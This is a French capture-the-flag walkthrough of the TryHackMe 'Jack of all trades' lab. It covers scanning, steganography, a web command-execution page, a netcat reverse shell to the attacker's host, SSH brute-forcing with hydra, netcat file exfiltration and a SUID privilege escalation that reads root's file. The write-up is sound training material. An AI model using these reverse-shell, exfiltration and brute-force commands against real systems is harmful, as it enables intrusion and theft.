# THM: Jack of all trade 
A réécrire mais bon l'important est là ;)

# Enumeration
## Nmap
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 08:29 EDT
Nmap scan report for 10.10.187.114
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.85 seconds
```
On vois ici que le port web est sur le port 22 et le port SSH sur le port 80. Ca commence bien !!!
## Gobuster
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.187.114:22/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 318] [--> http://10.10.187.114:22/assets/]
/index.html           (Status: 200) [Size: 1605]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
## Analyse 
Firefox refuse donc d'ouvrir la page, on va l'afficher avec curl :
```
┌──(kali㉿kali)-[~]
└─$ curl -s http://10.10.187.114:22/                    
<html>
        <head>
                <title>Jack-of-all-trades!</title>
                <link href="assets/style.css" rel=stylesheet type=text/css>
        </head>
        <body>
                <img id="header" src="assets/header.jpg" width=100%>
                <h1>Welcome to Jack-of-all-trades!</h1>
                <main>
                        <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
                        <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
                        <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
                        <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
                        <img src="assets/stego.jpg">
                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
                        <img src="assets/jackinthebox.jpg">
                        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
                        <p>I hope you choose to employ me. I love making new friends!</p>
                        <p>Hope to see you soon!</p>
                        <p id="signature">Jack</p>
                </main>
        </body>
</html>
```
Ici on vois qu'il existe une page /recovery.php, et une ligne encoder en base64 qui donne le résultat suivant :
```
┌──(kali㉿kali)-[~]
└─$ echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u*******q
```
On trouve un mot de passe !

Voici la page recovery :
```
┌──(kali㉿kali)-[~]
└─$ curl -s http://10.10.187.114:22/recovery.php

<!DOCTYPE html>
<html>
        <head>
                <title>Recovery Page</title>
                <style>
                        body{
                                text-align: center;
                        }
                </style>
        </head>
        <body>
                <h1>Hello Jack! Did you forget your machine password again?..</h1>
                <form action="/recovery.php" method="POST">
                        <label>Username:</label><br>
                        <input name="user" type="text"><br>
                        <label>Password:</label><br>
                        <input name="pass" type="password"><br>
                        <input type="submit" value="Submit">
                </form>
                <!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
                 
        </body>
</html>
```
Pour plus de facilité, on va modifier la configuration de Firefox pour afficher la page. Pour ce faire on va modifier le paramètres **network.security.ports.banned.override** et y ajouter le port **22**.
Et voila, on peux désormais voir la page directement dans le navigateur. Ca sera plus agréable que curl ! Maintenant, retournons à nos moutons.

Je vois encore ce qui ressemble a du base64 mais celui-ci ne montre rien de bien probant, il doit être encoder plusieurs fois, ou ce n'est pas du base64.

Je test les identifiants **Jack** et le mot de passe **u*******q**, mais cela ne fait rien.

## Stego !
Sur la page d'acceuil, je re-regarde le code source et je constate qu'une des images se nomme "stego" ce qui fait fortement penser a la stegonographie. (L'art de cacher des informations dans des images)
```
http://10.10.187.114:22/assets/stego.jpg
```
Je la télécharge et je test de l'ouvrir :
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/JackOfAllTrades]
└─$ steghide extract -sf stego.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!

```
Je test avec le mot de passe trouver plus haut :
```                                                                                                                                                              
┌──(kali㉿kali)-[~/Challenge/TryHackMe/JackOfAllTrades]
└─$ steghide extract -sf stego.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
```
Nickel! 
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/JackOfAllTrades]
└─$ cat creds.txt      
Hehe. Gotcha!

You're on the right path, but wrong image!
```
Ou pas!.......

On continue avec les autres images. Il doit bien en avoir une avec ce qu'on recherche !

```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/JackOfAllTrades]
└─$ steghide extract -sf jackinthebox.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
Toujours pas...
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/JackOfAllTrades]
└─$ steghide extract -sf header.jpg               
Enter passphrase: 
wrote extracted data to "cms.creds".
```
Hoho !!!!
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/JackOfAllTrades]
└─$ cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: T********Y
```
Enfin !! Je vais test ca sur la page Recovery.

## Recovery !
Cela fonctionne et redirigie vers **http://10.10.187.114:22/nnx****OV/index.php** qui nous affiche :
```
GET me a 'cmd' and I'll run it for you Future-Jack. 
```
On test !
```
http://10.10.187.114:22/nnx****OV/index.php?cmd=cat /etc/passwd
```
On à bien un résultat :
```
GET me a 'cmd' and I'll run it for you Future-Jack. root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false uuidd:x:104:109::/run/uuidd:/bin/false Debian-exim:x:105:110::/var/spool/exim4:/bin/false messagebus:x:106:111::/var/run/dbus:/bin/false statd:x:107:65534::/var/lib/nfs:/bin/false avahi-autoipd:x:108:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin jack:x:1000:1000:jack,,,:/home/jack:/bin/bash jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
```
Je vais donc pouvoir tester d'avoir un reverse shell.

# Exploitation
En envoyant le bon payload, j'arrive à avoir un revshell :

1) j'ouvre un listener
```
nc -lnvp 1234
```
2) j'injecte le payload encoder en URL
```
http://10.10.187.114:22/nnx****OV/index.php?cmd=nc%20-c%20%2Fbin%2Fbash%20<MONIP>%201234
```
3) J'ai le revshell !
```
──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [<MONIP>] from (UNKNOWN) [10.10.187.114] 33344
```
On stabilise le shell :
```
script /dev/null -c bash
```

Maintenant, c'est parti pour le privesc !
# Post exploitation
Actuellement nous sommes avec l'utilisateur **www-data*** mais on veux Jack !

Dans /home il y a un fichier **jacks_password_list**
```
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```
Il s'agit d'une wordlist de password utiliser par jack.

On va essayer de l'utiliser pour récupèrer le mot de passe de jack :

```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/JackOfAllTrades]
└─$ hydra -l jack -P passlist -s 80 10.10.187.114 ssh                                                          
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-27 10:16:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.10.187.114:80/
[80][ssh] host: 10.10.187.114   login: jack   password: ****************
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-27 10:16:53
```
Nickel on a un compte :

**login**: jack   
**password**: ****************

On a ainsi le compte de Jack :

```
www-data@jack-of-all-trades:/home$ su - jack
su - jack
Password: 

jack@jack-of-all-trades:~$ 
```
On va se connecté en SSH car c'est quand même plus agréable.
```
ssh jack@10.10.187.114 -p 80
```
Dans le **/home** de jack je trouve un fichier **user.jpg**

Pour le récupèrer, j'ai utiliser netcat :
Sur la machine :
```
nc monip port < user.jpg
```
Sur ma kali
```
nc -lnvp port > user.jpg
```
Et on trouve le 1er flag en plein milieu d'une recette de soupe de pinguin 
```
securi-tay2020_{********************************}
```

## Privesc to root!
On regarde ce que peux faire jack avec la commande **sudo -l**
```
jack@jack-of-all-trades:/tmp$ sudo -l
[sudo] password for jack: 
Sorry, user jack may not run sudo on jack-of-all-trades.
```
Jack ne peux rien faire. Ce bras cassé.

On tente avec linpeas. Il trouve une privesc avec strings qui à le paramètre **+s** (suid):
```
-rwsr-x--- 1 root dev 27K Feb 25  2015 /usr/bin/strings
```
En regardant sur GTFOBins, il y a moyen de l'exploiter.

On peux l'exploiter en 2 étapes, la 1ere et de lui indiquer le fichier à lire, ici, on souhaite le fichier **root.txt**
```
jack@jack-of-all-trades:/tmp$ LFILE=/root/root.txt
```
Ensuite, on doit executer strings avec la variable :
```
jack@jack-of-all-trades:/tmp$ /usr/bin/strings "$LFILE"
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{********************************}
```
Nous voila avec le flag root !
```
securi-tay2020_{********************************}
```
# BONUS !
Concernant le hashes présent sur la page recovery :
```
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
```
Après de longue rechercher car ca me trotter il s'agit enfaite d'une triple encodage base32->hex->rot13

On va pouvoir le lire avec la commande :
```
echo "GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=" | base32 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```
Ce qui donne :
```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```
Qui pointe vers **https://en.wikipedia.org/wiki/Stegosauria**
Un petit troll ce createur de room !
